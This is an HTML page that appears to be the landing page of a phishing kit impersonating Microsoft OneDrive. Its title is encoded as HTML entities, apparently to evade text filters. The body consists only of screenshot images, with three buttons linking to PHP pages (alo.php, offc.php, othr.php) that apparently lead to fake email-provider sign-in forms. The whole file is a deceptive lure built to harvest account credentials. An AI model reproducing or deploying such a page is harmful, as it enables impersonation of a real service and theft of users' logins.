<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#79;&#110;&#101;&#68;&#114;&#105;&#118;&#101;&#32;&#124;&#32;&#67;&#108;&#111;&#117;&#100;&#83;&#116;&#111;&#114;&#97;&#103;&#101;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:556px; z-index:0"><img src="images/b1.png" alt="" title="" border=0 width=1349 height=556></div>

<div id="image2" style="position:absolute; overflow:hidden; left:66px; top:601px; width:1225px; height:576px; z-index:1"><img src="images/b2.png" alt="" title="" border=0 width=1225 height=576></div>

<div id="image3" style="position:absolute; overflow:hidden; left:67px; top:1204px; width:1222px; height:659px; z-index:2"><img src="images/b3.png" alt="" title="" border=0 width=1222 height=659></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:1914px; width:1349px; height:405px; z-index:3"><img src="images/b4.png" alt="" title="" border=0 width=1349 height=405></div>

<div id="image5" style="position:absolute; overflow:hidden; left:204px; top:366px; width:180px; height:37px; z-index:4"><a href="alo.php"><img src="images/al.png" alt="" title="" border=0 width=180 height=37></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:204px; top:325px; width:209px; height:37px; z-index:5"><a href="offc.php"><img src="images/of.png" alt="" title="" border=0 width=209 height=37></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:203px; top:406px; width:226px; height:37px; z-index:6"><a href="othr.php"><img src="images/oth.png" alt="" title="" border=0 width=226 height=37></a></div>

</div>

</body>
</html>
